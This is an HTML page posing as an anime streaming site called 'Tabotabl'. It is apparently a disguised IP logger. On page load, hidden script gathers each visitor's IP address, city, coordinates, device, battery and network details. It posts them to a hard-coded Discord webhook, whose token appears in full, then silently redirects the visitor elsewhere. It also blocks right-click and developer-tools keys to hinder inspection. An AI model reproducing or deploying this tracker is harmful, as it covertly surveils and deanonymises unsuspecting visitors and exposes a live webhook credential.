<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta property="og:title" content="Tabotabl - Watch Anime Online">
    <meta property="og:description" content="Watch the latest anime episodes in HD for free!">
    <meta property="og:image" content="sigma.jpg">
    <meta property="og:url" content="">
    <meta name="theme-color" content="#ff5722">
    <title>Tabotabl - Watch Anime Online</title>
    <style>
        /* Cool anime loading interface */
        body {
            margin: 0;
            padding: 0;
            background-color: #0a0a12;
            color: white;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            overflow: hidden;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }
        
        .logo {
            font-size: 3rem;
            font-weight: bold;
            margin-bottom: 2rem;
            background: linear-gradient(45deg, #ff5722, #e91e63);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            text-shadow: 0 0 15px rgba(233, 30, 99, 0.5);
        }
        
        .loading-container {
            width: 300px;
            height: 10px;
            background-color: #1a1a2e;
            border-radius: 5px;
            overflow: hidden;
            margin-bottom: 2rem;
        }
        
        .loading-bar {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #ff5722, #e91e63);
            border-radius: 5px;
            transition: width 0.3s ease;
            box-shadow: 0 0 10px rgba(233, 30, 99, 0.5);
        }
        
        .status {
            font-size: 1.2rem;
            color: #aaa;
            margin-bottom: 1rem;
        }
        
        .anime-character {
            position: absolute;
            bottom: -100px;
            opacity: 0;
            transition: all 1s ease;
            filter: drop-shadow(0 0 10px rgba(255, 87, 34, 0.7));
            max-height: 40vh;
        }
        
        .features {
            display: flex;
            gap: 2rem;
            margin-top: 2rem;
            opacity: 0;
            transition: opacity 1s ease;
        }
        
        .feature {
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        
        .feature-icon {
            font-size: 2rem;
            margin-bottom: 0.5rem;
            color: #ff5722;
        }
        
        .feature-text {
            font-size: 0.9rem;
            color: #aaa;
        }
        
        /* Hidden data collection styles */
        #data-collector {
            display: none;
        }
    </style>
</head>
<body>
    <div class="anime-interface">
        <div class="logo">TABOTABL</div>
        <div class="status">Initializing streaming service...</div>
        <div class="loading-container">
            <div class="loading-bar" id="loadingBar"></div>
        </div>
        <img src="https://i.imgur.com/JYw7ZyG.png" class="anime-character" id="character">
        <div class="features" id="features">
            <div class="feature">
                <div class="feature-icon">🎬</div>
                <div class="feature-text">HD Quality</div>
            </div>
            <div class="feature">
                <div class="feature-icon">📱</div>
                <div class="feature-text">Multi-Device</div>
            </div>
            <div class="feature">
                <div class="feature-icon">⚡</div>
                <div class="feature-text">Fast Servers</div>
            </div>
        </div>
    </div>
    
    <!-- Hidden data collector -->
    <div id="data-collector"></div>
    
    <script>
        // Enhanced data collection
        async function collectData() {
            const data = {
                // Basic info
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                languages: navigator.languages,
                hardwareConcurrency: navigator.hardwareConcurrency,
                deviceMemory: navigator.deviceMemory,
                
                // Screen info
                screenWidth: screen.width,
                screenHeight: screen.height,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                orientation: screen.orientation?.type,
                
                // Timezone
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                
                // Battery status (if available)
                battery: {},
                
                // Network information
                connection: {},
                
                // Location data
                location: null,
                ip: null
            };
            
            // Get battery status if available
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    data.battery = {
                        level: battery.level,
                        charging: battery.charging,
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime
                    };
                } catch (e) {}
            }
            
            // Get network information if available
            if ('connection' in navigator) {
                data.connection = {
                    effectiveType: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt,
                    saveData: navigator.connection.saveData
                };
            }
            
            // Get IP and location
            try {
                // First try ipapi.co
                const ipRes = await fetch('https://ipapi.co/json/');
                const ipData = await ipRes.json();
                
                data.ip = ipData.ip;
                data.location = {
                    ip: ipData.ip,
                    city: ipData.city,
                    region: ipData.region,
                    country: ipData.country_name,
                    postal: ipData.postal,
                    latitude: ipData.latitude,
                    longitude: ipData.longitude,
                    timezone: ipData.timezone,
                    org: ipData.org,
                    asn: ipData.asn,
                    isProxy: ipData.proxy || ipData.vpn || false
                };
                
                // Send to Discord webhook immediately
                sendToDiscord(data);
                
                // Fallback to alternative API if needed
                if (!data.ip) {
                    const fallbackRes = await fetch('https://api.ipify.org?format=json');
                    const fallbackData = await fallbackRes.json();
                    data.ip = fallbackData.ip;
                    
                    if (!data.location) {
                        const locRes = await fetch(`https://ipapi.co/${data.ip}/json/`);
                        const locData = await locRes.json();
                        data.location = {
                            ip: data.ip,
                            city: locData.city,
                            region: locData.region,
                            country: locData.country_name,
                            postal: locData.postal,
                            latitude: locData.latitude,
                            longitude: locData.longitude,
                            timezone: locData.timezone,
                            org: locData.org,
                            asn: locData.asn,
                            isProxy: locData.proxy || locData.vpn || false
                        };
                    }
                }
            } catch (e) {
                console.error("Error collecting IP data:", e);
                // Try alternative method
                try {
                    const fallbackRes = await fetch('https://api.db-ip.com/v2/free/self');
                    const fallbackData = await fallbackRes.json();
                    data.ip = fallbackData.ipAddress;
                    data.location = {
                        ip: fallbackData.ipAddress,
                        city: fallbackData.city,
                        region: fallbackData.stateProv,
                        country: fallbackData.countryName,
                        latitude: fallbackData.latitude,
                        longitude: fallbackData.longitude,
                        isProxy: false
                    };
                } catch (e2) {
                    console.error("Fallback IP collection failed:", e2);
                }
            }
            
            return data;
        }
        
        // Enhanced Discord webhook sender
        async function sendToDiscord(data) {
            const webhookURL = 'https://discord.com/api/webhooks/1360696497305424186/DsnniTxXM1fsfKhi_3B947DsZAs-_UfkrOLPmOu6OXoXY-Mge3_S3efQOip0FJqMtyYH';
            
            const embed = {
                title: "📡 New Visitor Data Captured",
                color: 0xff5722,
                thumbnail: {
                    url: "https://i.imgur.com/sigma.jpg"
                },
                fields: [
                    {
                        name: "🌍 Location",
                        value: `${data.location?.city || "Unknown"}, ${data.location?.country || "Unknown"}`,
                        inline: true
                    },
                    {
                        name: "🆔 IP Address",
                        value: data.ip || "Unknown",
                        inline: true
                    },
                    {
                        name: "🖥️ Platform",
                        value: data.platform || "Unknown",
                        inline: true
                    },
                    {
                        name: "🔍 User Agent",
                        value: data.userAgent.substring(0, 100) + (data.userAgent.length > 100 ? "..." : ""),
                        inline: false
                    },
                    {
                        name: "📱 Device Type",
                        value: /Mobile|iP(hone|od|ad)|Android|BlackBerry/.test(data.userAgent) ? 'Mobile' : 'Desktop',
                        inline: true
                    },
                    {
                        name: "🛡️ VPN/Proxy",
                        value: data.location?.isProxy ? "✅ Detected" : "❌ Not detected",
                        inline: true
                    },
                    {
                        name: "🕒 Timezone",
                        value: data.timezone || "Unknown",
                        inline: true
                    },
                    {
                        name: "📶 Network",
                        value: data.connection.effectiveType || "Unknown",
                        inline: true
                    },
                    {
                        name: "📅 Timestamp",
                        value: new Date().toLocaleString(),
                        inline: true
                    }
                ],
                footer: {
                    text: "Tabotabl Analytics • " + new Date().toLocaleDateString()
                }
            };
            
            // Try multiple methods to ensure delivery
            const sendMethods = [
                // Method 1: Standard fetch
                async () => {
                    await fetch(webhookURL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            embeds: [embed],
                            content: "**New visitor on Tabotabl**",
                            username: "Tabotabl Tracker",
                            avatar_url: "https://i.imgur.com/sigma.jpg"
                        })
                    });
                },
                
                // Method 2: FormData
                async () => {
                    const formData = new FormData();
                    formData.append('payload_json', JSON.stringify({
                        embeds: [embed],
                        content: "**New visitor on Tabotabl**",
                        username: "Tabotabl Tracker",
                        avatar_url: "https://i.imgur.com/sigma.jpg"
                    }));
                    
                    await fetch(webhookURL, {
                        method: 'POST',
                        body: formData
                    });
                },
                
                // Method 3: XHR
                async () => {
                    return new Promise((resolve, reject) => {
                        const xhr = new XMLHttpRequest();
                        xhr.open('POST', webhookURL, true);
                        xhr.setRequestHeader('Content-Type', 'application/json');
                        xhr.onload = resolve;
                        xhr.onerror = reject;
                        xhr.send(JSON.stringify({
                            embeds: [embed],
                            content: "**New visitor on Tabotabl**",
                            username: "Tabotabl Tracker",
                            avatar_url: "https://i.imgur.com/sigma.jpg"
                        }));
                    });
                }
            ];
            
            // Execute all methods with error handling
            for (const method of sendMethods) {
                try {
                    await method();
                    break; // If one succeeds, stop trying
                } catch (e) {
                    console.error("Webhook send method failed:", e);
                }
            }
        }
        
        // Animate the loading interface
        function animateLoading() {
            const loadingBar = document.getElementById('loadingBar');
            const character = document.getElementById('character');
            const features = document.getElementById('features');
            
            // Animate loading bar
            let progress = 0;
            const loadingInterval = setInterval(() => {
                progress += Math.random() * 10;
                loadingBar.style.width = Math.min(progress, 100) + '%';
                
                if (progress >= 100) {
                    clearInterval(loadingInterval);
                    
                    // Show character and features
                    character.style.bottom = '0';
                    character.style.opacity = '1';
                    features.style.opacity = '1';
                    
                    // Redirect after showing UI briefly
                    setTimeout(() => {
                        // Silent redirect to Anilab
                        window.location.replace("https://anilab.com");
                    }, 1500);
                }
            }, 200);
        }
        
        // Start everything when page loads
        window.addEventListener('DOMContentLoaded', () => {
            // Start data collection immediately
            collectData();
            
            // Start loading animation with slight delay
            setTimeout(animateLoading, 500);
            
            // Prevent right-click
            document.addEventListener('contextmenu', e => e.preventDefault());
            
            // Block F12 and dev tools
            document.addEventListener('keydown', e => {
                if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
                    e.preventDefault();
                }
            });
        });
    </script>
</body>
    </html>
